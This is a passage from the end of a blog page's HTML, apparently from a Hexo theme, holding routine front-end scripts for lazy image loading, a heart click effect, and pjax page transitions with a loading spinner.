    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    lazyLoadInstance.update();
  });
  document.addEventListener('pjax:complete', function () {
    lazyLoadInstance.update();
  });
</script>


<!-- 卡片滚动动画 -->
   

<!-- 评论所需js -->

  


<!-- 鼠标点击特效 -->
<!-- 爱心点击 -->

   
    <script src="/js/cursor/clicklove.js"></script> 
  





    <!-- pjax -->
    

<!-- pjax -->


  <script src="/js/pjax@0.2.8/index.js"></script>
  
    <!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->

<div class="pjax-animate">
  
    <div class="loading-circle"><div id="loader-circle"></div></div>
    <script>
      window.ShowLoading = function() {
        $(".loading-circle").css("display", "block");
      };
      window.HideLoading = function() {
        $(".loading-circle").css("display", "none");
      }
    </script>
  
	<script>
    document.addEventListener('pjax:complete', function () {
      window.HideLoading();
    })
    document.addEventListener('pjax:send', function () {
      window.ShowLoading();
    })
    document.addEventListener('pjax:error', function () {
      window.HideLoading();
    })
	</script>
</div>

  

  <script>
    var pjax = new Pjax({
      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
      timeout: 5000
    });

    document.addEventListener('pjax:send', function (e) {

      try {
        var currentUrl = window.location.pathname;
        var targetUrl = e.triggerElement.href;
        var banUrl = [""];
        if (banUrl[0] != "") {
          banUrl.forEach(item => {
            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
              window.location.href = targetUrl;
            }
          });
        }
      } catch (error) {}

      $(window).unbind('resize');
      $(window).unbind('scroll');
      $(document).unbind('scroll');
      $(document).unbind('click');
      $('body').unbind('click');

    })
    
    document.addEventListener('pjax:complete', function () {
      $('script[data-pjax], .pjax-reload script').each(function () {
        $(this).parent().append($(this).remove());
      });
    });

    document.addEventListener('pjax:error', function (e) {
      window.location.href = e.triggerElement.href;
    })
    
    // 刷新不从顶部开始
    document.addEventListener("DOMContentLoaded", function () {
      history.scrollRestoration = 'auto';
    })
  </script>



  </body>
</html>